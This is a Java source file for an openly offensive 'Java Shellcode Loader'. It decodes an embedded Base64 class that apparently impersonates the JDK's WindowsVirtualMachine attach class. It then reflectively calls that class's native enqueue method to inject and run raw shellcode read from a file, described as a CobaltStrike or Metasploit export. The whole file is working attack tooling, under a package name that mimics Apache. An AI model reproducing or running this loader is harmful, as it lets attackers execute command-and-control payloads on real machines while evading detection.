package com.apache.corebiz;

import com.apache.corebiz.utils.Base64;
import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


public class Main {

    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            printUsage();
            System.exit(-1);
        }

        class MyClassLoader extends ClassLoader{
            public Class getClass(byte[] buff)throws Exception{
                return super.defineClass(buff,0,buff.length);
            }
        }
        // 还是得通过defineClass来获取class
        Base64 base64 = new Base64();
        String classStr = "yv66vgAAADEAJgoACAAUCAAVCgAWABcJABYAGAgAGQoAGgAbBwAcBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAB2VucXVldWUBAD0oSltCTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylWAQAKRXhjZXB0aW9ucwcAHgEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAJAAoBAAZhdHRhY2gHAB8MACAAIQwAIgAjAQAbWytdIGxvYWQgYXR0YWNoLmRsbCBzdWNjZXNzBwAkDAAlACEBACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2xvYWRMaWJyYXJ5AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4AIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcAAbEAAAABAAwAAAAGAAEAAAAJAYgADQAOAAEADwAAAAQAAQAQAAgAEQAKAAEACwAAAC4AAgAAAAAADhICuAADsgAEEgW2AAaxAAAAAQAMAAAADgADAAAACwAFAAwADQANAAEAEgAAAAIAEw==";
        byte[] decode = base64.decode(classStr);
        Class clazz = new MyClassLoader().getClass(decode);

        String filePath = String.valueOf(args[0]);
        File file = new File(filePath);
        byte[] bytesArray = new byte[(int) file.length()];
        FileInputStream fis = new FileInputStream(file);
        fis.read(bytesArray);
        fis.close();
        System.out.println("[+] start injecting shellcode now...");
        Method[] allMethods = clazz.getDeclaredMethods();
        for (int i = allMethods.length - 1; i >= 0; i--) {
            Method m = allMethods[i];
            if(m.getName().equals("enqueue")){
                long hProcess=-1;
                byte buf[] = bytesArray;
                m.setAccessible(true);
                try {
                    m.invoke(clazz,new Object[]{hProcess,buf,(String)null,(String)null,new Object[]{}});
                }catch (InvocationTargetException e){
                    System.out.println("[!] your jre version maybe too high, can't inject successful :( ");
                }
            }
        }
    }

    private static void printUsage() {
        System.err.println("[*] Java Shellcode Loader.");
        System.err.println("[*] Author: tudou.");
        System.err.println("[*] Usage: java -jar jarShellcodeLoader-[version].jar ./shellcode_raw.bin");
        System.err.println("[*] Tip: shellcode_raw.bin is a bin file exported from CobaltStrike or msf.");
    }

}
